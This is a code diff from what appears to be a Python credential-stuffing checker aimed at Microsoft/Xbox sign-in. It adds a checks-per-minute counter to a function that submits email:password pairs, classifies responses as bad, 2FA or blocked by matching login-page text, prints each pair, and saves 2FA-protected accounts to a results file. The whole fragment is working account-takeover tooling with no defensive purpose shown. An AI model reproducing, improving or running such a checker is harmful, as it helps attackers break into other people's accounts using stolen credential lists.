@@ -172,12 +172,14 @@ def get_xbox_rps(session, email, password, urlPost, sFTTag, tries=0):
             else:
                 bad+=1
                 checked+=1
+                cpm+=1
                 if screen == "'2'": print(Fore.RED+f"Bad: {email}:{password}")
                 return None
         #2fa
         elif any(value in login_request.text for value in ["recover?mkt" , "account.live.com/identity/confirm?mkt", "Email/Confirm?mkt", "/Abuse?mkt="]):
             twofa+=1
             checked+=1
+            cpm+=1
             if screen == "'2'": print(Fore.MAGENTA+f"2FA: {email}:{password}")
             with open(f"results/{day}/2fa.txt", 'a') as file: file.write(f"{email}:{password}\n")
             return None
@@ -185,6 +187,7 @@ def get_xbox_rps(session, email, password, urlPost, sFTTag, tries=0):
         elif any(value in login_request.text for value in ["Your account or password is incorrect." , "That Microsoft account doesn't exist. Enter a different account" , "Sign in to your Microsoft account" ]):
             bad+=1
             checked+=1
+            cpm+=1
             if screen == "'2'": print(Fore.RED+f"Bad: {email}:{password}")
             return None
         #blocked, retry
@@ -197,6 +200,7 @@ def get_xbox_rps(session, email, password, urlPost, sFTTag, tries=0):
             else:
                 bad+=1
                 checked+=1
+                cpm+=1
                 if screen == "'2'": print(Fore.RED+f"Bad: {email}:{password}")
                 return None
     except:
@@ -206,6 +210,7 @@ def get_xbox_rps(session, email, password, urlPost, sFTTag, tries=0):
         else:
             bad+=1
             checked+=1
+            cpm+=1
             if screen == "'2'": print(Fore.RED+f"Bad: {email}:{password}")
             return None
 
